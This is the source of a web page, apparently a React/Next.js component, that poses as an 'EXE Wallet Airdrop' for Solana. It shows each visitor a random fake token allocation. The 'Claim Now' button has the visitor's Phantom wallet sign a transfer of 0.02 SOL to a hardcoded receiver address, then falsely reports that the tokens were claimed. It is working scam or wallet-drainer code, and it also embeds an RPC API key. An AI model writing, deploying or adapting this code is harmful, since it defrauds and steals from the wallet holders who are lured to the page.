// @ts-nocheck
'use client';

import { useState } from 'react';
import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import { Toaster, toast } from 'react-hot-toast';

const RPC = 'https://solana-mainnet.g.alchemy.com/v2/V2on79gQAxg105TY0MKFM';
const RECEIVER = new PublicKey('FM7huQouPgKmAVkEatSWA9x7aW8ArmbjSNosR62ctdyr'); // Your wallet address

const claimedWallets = new Set();

export default function Page() {
  const [wallet, setWallet] = useState('');
  const [alloc, setAlloc] = useState<number | null>(null);
  const [hasChecked, setHasChecked] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);

  const checkAllocation = () => {
    if (!wallet) {
      toast.error('Enter a valid Solana address');
      return;
    }

    if (claimedWallets.has(wallet)) {
      toast.error('Already claimed');
      return;
    }

    const randomAlloc = Math.floor(Math.random() * (2000 - 50 + 1)) + 50;
    setAlloc(randomAlloc);
    setHasChecked(true);
  };

  const claim = async () => {
    if (!window.solana?.isPhantom) {
      toast.error('Please install Phantom Wallet');
      return;
    }

    try {
      setIsClaiming(true);
      await window.solana.connect();
      const payer = window.solana.publicKey;
      const connection = new Connection(RPC);

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: payer,
          toPubkey: RECEIVER,
          lamports: 0.02 * 1e9,
        })
      );

      tx.feePayer = payer;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      const signed = await window.solana.signTransaction(tx);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, 'confirmed');

      claimedWallets.add(wallet);
      toast.success(`✅ Successfully claimed ${alloc} EXE!`);
    } catch (err) {
      toast.error('Transaction failed');
    } finally {
      setIsClaiming(false);
    }
  };

  return (
    <main className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black text-white flex items-center justify-center">
      <div className="flex flex-col gap-6 text-center p-6 w-full max-w-md">
        <h1 className="text-3xl font-bold">EXE Wallet Airdrop</h1>

        {!hasChecked ? (
          <>
            <input
              className="p-3 text-black rounded"
              placeholder="Enter Solana wallet address"
              value={wallet}
              onChange={(e) => setWallet(e.target.value)}
            />
            <button
              className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded font-semibold"
              onClick={checkAllocation}
            >
              Check Allocation
            </button>
          </>
        ) : (
          <>
            <div className="text-lg font-medium">🎉 Allocation: {alloc} EXE</div>
            <button
              className="bg-green-600 hover:bg-green-700 px-4 py-2 rounded font-semibold"
              onClick={claim}
              disabled={isClaiming}
            >
              {isClaiming ? 'Claiming...' : 'Claim Now'}
            </button>
          </>
        )}

        <Toaster position="top-right" />
      </div>
    </main>
  );
}
